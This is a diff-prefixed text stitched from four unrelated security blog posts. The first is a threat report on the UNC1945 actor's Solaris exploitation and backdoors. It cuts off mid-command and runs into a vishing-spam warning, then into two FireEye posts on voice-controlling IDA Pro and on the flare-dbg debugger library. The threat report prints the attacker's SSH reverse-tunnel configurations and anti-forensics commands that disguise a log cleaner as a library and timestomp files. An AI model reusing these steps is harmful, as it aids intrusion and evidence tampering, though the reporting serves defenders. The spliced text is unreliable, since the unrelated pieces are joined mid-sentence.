+EVILSUN—a remote exploitation tool containing a zero-day exploit for CVE-2020-14871—on a Solaris 9 server.
+At the time, connections from the server to the threat actor IP address were observed over port 8080.
+Mandiant discovered and reported CVE-2020-14871, a recently patched vulnerability in the Oracle Solaris Pluggable Authentication Module (PAM) that allows an unauthenticated attacker with network access via multiple protocols to exploit and compromise the operating system.
+According to an April 2020 post on a black-market website, an “Oracle Solaris SSHD Remote Root Exploit” was available for approximately $3,000 USD, which may be identifiable with EVILSUN.
+Additionally, we confirmed a Solaris server exposed to the internet had critical vulnerabilities, which included the possibility of remote exploitation without authentication.
+Establish Foothold and Maintain Persistence The threat actor used a Solaris Pluggable Authentication Module backdoor we refer to as SLAPSTICK to establish a foothold on a Solaris 9 server.
+This facilitated user access to the system with a secret hard-coded password and allowed the threat actors to escalate privileges and maintain persistence (see Figure 1).
+Log –font –unix | /usr/lib/ssh/sshd sshd kbdint - can <Encoded Password> <IP REDACTED>
+Magical Password auth.info | sshd[11800]: [ID 800047 auth.info] Accepted keyboard-interactive for root from <IP REDACTED> port 39680 ssh2 auth.notice | su:
+[ID 366847 auth.notice] ‘su root’ - succeeded for netcool on /dev/pts/31 Figure 1: SLAPSTICK logs At the initial victim, UNC1945 placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder.
+A day later, the threat actor positioned a custom Linux backdoor, which Mandiant named LEMONSTICK, on the same workstation.
+LEMONSTICK capabilities include command execution, file transfer and execution, and the ability to establish tunnel connections.
+(see Figure 2).
+FileItem:changed | /usr/lib64/security/pam_unix,so [57720] Audit log | [audit_type: USER_END] user pid=10080 uid=0
+auid=0 msg='PAM: session close acct=root\" : exe=\"/usr/sbin/sshd\" (hostname=1.239.171.32, addr=1.239.171.32, terminal=ssh res=success)'\" FileItem:
+Accessed | /var/tmp/.cache/ocb_static Figure 2: UNC1945 emplacement of SLAPSTICK UNC1945 obtained and maintained access to their external infrastructure using an SSH Port Forwarding mechanism despite the host lacking accessibility to the internet directly.
+SSH Port Forwarding is a mechanism implemented in SSH protocol for transporting arbitrary networking data over an encrypted SSH connection (tunneling).
+This feature can be used for adding encryption to legacy applications traversing firewalls or with malicious intent to access internal networks from the the internet.
+The UNC1945 configurations we observed are similarly structured with respect to the host alias, specified options, and option order (see Figure 3).
+config1 config2 Host <redacted> HostName <redacted>
+Port 900 User <redacted> IdentityFile <redacted> KbdInteractiveAuthentication no PasswordAuthentication
+no NoHostAuthenticationForLocalhost yes StrictHostKeyChecking no UserKnownHostsFile /dev/null RemoteForward 33002 127.0.0.1:22 Host <redacted> HostName <redacted> Port 443 User <redacted> IdentityFile <redacted> KbdInteractiveAuthentication no PasswordAuthentication
+no NoHostAuthenticationForLocalhost yes StrictHostKeyChecking no UserKnownHostsFile /dev/null ServerAliveInterval 30 ServerAliveCountMax 3 RemoteForward 2224 <redacted>:22 Figure 3: SSH config files used by UNC1945 at different incidents As part of this multi-stage operation, UNC1945 dropped a custom QEMU Virtual Machine (VM) on multiple hosts, which was executed inside of any Linux system by launching a ‘start.sh’ script.
+The script contained TCP forwarding settings that could be used by the threat actor in conjunction with the SSH tunnels to give direct access from the threat actor VM to the command and control server to obfuscate interaction with customer infrastructure.
+The VM was running a version of the Tiny Core Linux OS with pre-loaded scripts and tools.
+Also, we analyzed the Virtual Machine file system timestamps, which coincided with UNC1945's overall operational timeline.
+The VM contained numerous tools such as network scanners, exploits and reconnaissance tools.
+Tiny Core Linux pre-loaded tools included Mimikatz, Powersploit, Responder, Procdump, CrackMapExec, PoshC2, Medusa, JBoss Vulnerability Scanner and more.
+Efforts to decrease operational visibility included placing tool and output files within temporary file system mount points that were stored in volatile memory.
+Additionally, UNC1945 used built-in utilities and public tools to modify timestamps and selectively manipulate Unix log files.
+UNC1945 employed anti-forensics techniques with the use of a custom ELF utility named LOGBLEACH.
+The actor used built-in Linux commands to alter the timestamps of files and directories and used LOGBLEACH to clean logs to thwart forensic analysis, as seen in Figure 4.
+$ ./b -C -y
+-a $ mv b /usr/lib64/libXbleach.so.1 $ cd /usr/lib64/ $ touch -acm -r librpmio.so.3.2.2 $ touch -acm -rWith the colossal amount of telephone scamming these days, you’d be hard-pressed to find a phone owner anywhere on the planet who hasn’t been a scammer’s target at least once .
+But like all forms of cold calling, phone scams are resource-intensive and highly inefficient.
+Therefore, some scammers try to optimize the process by getting potential victims to call them.
+One tool they use is good old-fashioned spam.
+“If you didn’t make this purchase, please call us” We recently detected several waves of spam e-mails, seemingly from reputable companies, notifying recipients of substantial purchases.
+The item in question is usually a high-end device such as the latest Apple Watch or a gaming laptop purchased from Amazon or paid for through PayPal.
+Fake PayPal/Amazon purchase confirmations with vishing phone numbers Other, more exotic variants crop up from time to time.
+For example, we detected an e-mail about the purchase of $1,999 worth of “Cryptocurrency (Bitcoin)”:
+Fake PayPal notification, including the scammers’ phone number, of a “Cryptocurrency (Bitcoin)”
+purchase Other, similar notifications mention the purchase of security software licenses — we’ve seen some referring to Norton and even Kaspersky (although our product lineup has never included a “Kaspersky Total Protection.”)
+Fake notifications about the purchase of Norton and “Kaspersky Total Protection” licenses with vishing phone numbers The scam relies on recipients being so alarmed by the not-insubstantial loss that they will act rashly, hoping to get their money back.
+Of course, their money hasn’t gone anywhere — at least, not yet.
+This particular strain of spam e-mails contain no links, but they do include a phone number that the victim is asked to call if they want to change or cancel the order.
+Sometimes the number sits unobtrusively somewhere at the bottom of the text.
+Other times it is highlighted in red and repeated several times in the message.
+What happens if you call?
+Most likely the scammers will try to wangle your login credentials for some financial service or bank card details.
+Alternatively, they might try to trick you into transferring money or even installing a Trojan on your computer, which has been known to happen .
+The only limits are the scammers’ imagination and vishing skills.
+How to guard against such e-mails The particulars may change, but all scams have certain elements in common: the use of some sort of trick to get someone to do something.
+Vishing is no different.
+Follow these guidelines for safety: Do not call back; Log in to your account with the service in question — type the address into your browser; don’t click on any links in the message — and check your orders or recent activity page; Check your balance and the list of recent transactions on all of your cards, if you have reason for concern; Install a reliable antivirus utility with protection against financial attacks, phishing, and online fraud.
+
+
+Introduction This blog post is the next episode in the FireEye Labs Advanced Reverse Engineering (FLARE) team Script Series.
+Today, we are sharing something quite unusual.
+It is not a tool or a virtual machine distribution, nor is it a plugin or script for a popular reverse engineering tool or framework.
+Rather, it is a profile created for a consumer software application completely unrelated to reverse engineering or malware analysis… until now.
+The software is named VoiceAttack , and its purpose is to make it easy for users to control other software on their computer using voice commands.
+With FLARE’s new profile for VoiceAttack , users can completely control IDA Pro with their voice!
+Have you ever dreamed of telling IDA Pro to decompile a function or show you the strings of a binary?
+Well dream no more!
+Not only does our profile give you total control of the software, it also provides shortcuts and other cool features not previously available.
+It’s our hope that providing voice control for the world’s most popular disassembler will further empower users with repetitive stress injuries or disabilities to more effectively put their reverse engineering skills to use with this new accessibility option as well as helping the community at large work more efficiently.
+Check out our video demonstration of some of the features of the profile to see it in action. &amp;amp;nbsp; How Does It Work?
+Voice attack is an inexpensive software application that utilizes the Windows Speech Recognition (WSR) feature to enable the creation of user-defined, voice-activated macros.
+The user specifies a key word or phrase, then defines one or more actions to be taken when that word or phrase is recognized.
+The most common types of actions to be taken include key presses, mouse movement and clicks, and clipboard manipulation.
+However, there are many other more advanced features available that provide a lot of flexibility to users including variables, loops, and conditionals.
+You can even have the computer speak to you in response to your commands!
+VoiceAttack requires an internet connection, but only during the registration process, after which the network adapter can be disabled or configured to a network that cannot reach the internet without issue.
+To use VoiceAttack, you must first train Windows Speech Recognition to recognize your voice.
+Instructions on how to do so can be found here .
+This process only takes a few minutes at minimum, but the more time you spend training, the better the experience you will have with it.
+What Does the IDA Pro Profile Provide?
+FLARE’s IDA Pro profile for VoiceAttack maps every advertised keyboard shortcut in IDA Pro to a voice command.
+Although this is only one part of what the profile provides, many users will find this in itself very useful.
+When developing this profile, I was shocked to discover just how many keyboard shortcuts there really are for IDA Pro and what can be accomplished with them.
+Some of my favorite shortcuts are found under the View->Open Subviews and Windows menus.
+With this profile, I can simply say “show strings” or “show structures” or “show window x” to change the tab I am currently viewing or open a new view in a tab without having to move my mouse cursor anywhere.
+The next few paragraphs describe some other useful commands to make any reverse engineer’s job easier.
+For a more detailed description of the profile and commands available, see the Github page .
+Macros A series of voice commands can perform multi-step actions not otherwise reachable by individual keyboard shortcuts.
+For example, wouldn’t it be nice to have commands to toggle the visibility of opcode bytes (see Figure 1)?
+Currently, you have to open the Options menu, select the General menu item, input a value in the Number of opcode bytes text field, and click the OK button.
+Well, now you can simply say “show opcodes” or “hide opcodes” and it will be so!
+Figure 1:
+Configuring the number of opcode bytes to show in IDA Pro's disassembly view Defining a Unicode string in IDA Pro is a multi-step exercise, whether you navigate to the Edit->Strings menu or use the “string literals” keyboard shortcut Alt+A followed by pressing the U key as shown in Figure 2.
+Now you can simply say “make Unicode string” and the work is done for you.
+Figure 2: String literals dialog in IDA Pro Reversing a C++ application?
+The Create struct from selection action is a very helpful feature in this case, but it requires you to navigate to the Edit->Structs menu in order to use it.
+The voice command “create struct from selection” does this for you automatically.
+The “look it up” command will copy the currently highlighted token in the disassembly and search Google for it using your default browser.
+There are several other macros in the profile that are like this and save you a lot of time navigating menus and dialogs to perform simple actions.
+Cursor Movement, Dialogs, and Navigation The cursor movement commands allow the user to move the cursor up, down, left, or right, one or more times, in specified increments.
+These commands also allow for scrolling with a voice command that commences scrolling in a chosen direction, and another voice command for stopping scrolling.
+There are even voice commands to set the speed of the scroll to slow, medium, or fast.
+In the disassembly view, the cursor can also be moved per “word” on the current line of the disassembly or decompilation, or even per basic block or function.
+Like many other applications, dialogs are a part of IDA Pro’s user interface.
+The ability to easily navigate and interact with items in a dialog with your voice is essential to a smooth user experience.
+Voice commands in the profile enable the user to easily click the OK or Cancel buttons, toggle checkboxes, and tab through controls in the dialog in both directions and in specified increments.
+With the aid of a companion IDAPython plugin , additional navigation commands are supported.
+Commands that allow the user to move the cursor to the beginning or end of the current function, to the next or previous “call” instruction, to the previous or next instruction containing the highlighted token, or to a specified number of bytes forward or backwards from the current cursor position help to make voice-controlled navigation easier.
+These cursor movement and navigation commands enable users to have full control of IDA Pro without the use of their hands.
+While this is true and an important goal for the profile, it is not practical for people who have full use of their hands to go completely hands-free.Introduction We are expanding our script series beyond IDA Pro.
+This post extends the FireEye Labs Advanced Reverse Engineering (FLARE) script series to an invaluable tool for the reverse engineer – the debugger.
+Just like IDA Pro, debuggers have scripting interfaces.
+For example, OllyDbg uses an asm-like scripting language, the Immunity debugger contains a Python interface, and Windbg has its own language.
+Each of these options isn’t ideal for rapidly creating string decoding debugger scripts.
+Both Immunity and OllyDbg only support 32-bit applications, and Windbg’s scripting language is specific to Windbg and, therefore, not as well-known.
+The pykd project was created to interface between Python and Windbg to allow debugger scripts to be written in Python.
+Because malware reverse engineers love Python, we built our debugger scripting library on top of pykd for Windbg.
+Here we release a library we call flare-dbg .
+This library provides several utility classes and functions to rapidly develop scripts to automate debugging tasks within Windbg.
+Stay tuned for future blog posts that will describe additional uses for debugger scripts!
+String Decoding Malware authors like to hide the intent of their software by obfuscating their strings.
+Quickly deobfuscating strings allows you to quickly figure out what the malware is doing.
+As stated in Practical Malware Analysis, there are generally two approaches to deobfuscating strings: self-decoding and manual programming.
+The self-decoding approach allows the malware to decode its own strings.
+Manual programming requires the reverse engineer to reprogram the decoding function logic.
+A subset of the self-decoding approach is emulation, where each assembly instruction execution is emulated.
+Unfortunately, library call emulation is required, and emulating every library call is difficult and may cause inaccurate results.
+In contrast, a debugger is attached to the actual running process, so all the library functions can be run without issue.
+Each of these approaches has their place, but this post teaches a way to use debugger scripting to automatically self-decode all obfuscated strings.
+Challenge To decode all obfsucated strings, we need to find the following: the string decoder function, each time it is called, and all arguments to each of those instances.
+We then need to run the function and read out the result.
+The challenge is to do this in a semi-automated way.
+Approach The first task is to find the string decoder function and get a basic understanding of the inputs and outputs of the function.
+The next task is to identify each time the string decoder function is called and all of the arguments to each call.
+Without using IDA, a handy Python project for binary analysis is Vivisect .
+Vivisect contains several heuristics for identifying functions and cross-references.
+Additionally, Vivisect can emulate and disassemble a series of opcodes, which can help us identify function arguments.
+If you haven’t already, be sure to check out the FLARE scripting series post on tracking function arguments using emulation , which also uses Vivisect.
+Introducing flare-dbg The FLARE team is introducing a Python project, flare-dbg that runs on top of pykd.
+Its goal is to make Windbg scripting easy.
+The heart of the flare-dbg project lies in the DebugUtils class, which contains several functions to handle: ·      Memory and register manipulation ·      Stack operations ·      Debugger execution ·      Breakpoints ·      Function calling In addition to the basic debugger utility functions, the DebugUtils class uses Vivisect to handle the binary analysis portion.
+Example I wrote a simple piece of malware that hides strings by encoding them.
+Figure 1 shows an HTTP User-Agent string being decoded by a function I named string_decoder.
+Figure 1: String decoder function reference in IDA Pro After a cursory look at the string_decoder function, the arguments are identified as an offset to an encoded string of bytes, an output address, and a length.
+The function can be described as the following C prototype: Now that we have a basic understanding of the string_decoder function, we test decoding using Windbg and flare-dbg.
+We begin by starting the process with Windbg and executing until the program’s entry point.
+Next, we start a Python interactive shell within Windbg using pykd and import flaredbg.
+Next, we create a DebugUtils object, which contains the functions we need to control the debugger.
+We then allocate 0x3A-bytes of memory for the output string.
+We use the newly allocated memory as the second parameter and setup the remainder of the arguments.
+Finally, we call the string_decoder function at virtual address 0x401000, and read the output string buffer.
+After proving we can decode a string with flare-dbg , let’s automate all calls to the string_decoder function.
+An example debugger script is shown in Figure 2.
+The full script is available in the examples directory in the github repository.
+Figure 2.
+Example basic debugger script Let’s break this script down.
+First, we identify the function virtual address of the string decoder function and create a DebugUtils object.
+Next, we use the DebugUtils function get_call_list to find the three push arguments for each time string_decoder is called.
+Once the call_list is generated, we iterate all calling addresses and associated arguments.
+In this example, the output string is decoded to the stack.
+Because we are only executing the string decoder function and won’t have the same stack setup as the malware, we must allocate memory for the output string.
+We use the third parameter, the length, to specify the size of the memory allocation.
+Once we allocate memory for the output string, we set the newly allocated memory address as the second parameter to receive the output bytes.
+Finally, we run the string_decoder function by using the DebugUtils call function and read the result from our allocated buffer.
+The call function sets up the stack, sets any specified register values, and executes the function.
+Once all strings are decoded, the final step is to get these strings back into our IDB.
+ The utils script contains utility functions to create IDA Python scripts.
+In this case, we output an IDA Python script that creates comments in the IDB.
+Running this debugger script produces the following output: The output IDA Python script creates repeatable comments on all encoded string locations, as shown in Figure 3.
+Figure 3.
+Decoded string as comment Conclusion Stay tuned for another debugger scripting series post that will focus on plugins!
+For now, head over to the flare-dbg github project page to get started.
+The project requires pykd , winappdbg , and vivisect .
+Subscribe to Blogs Get email updates as new blog posts are added.
+
+
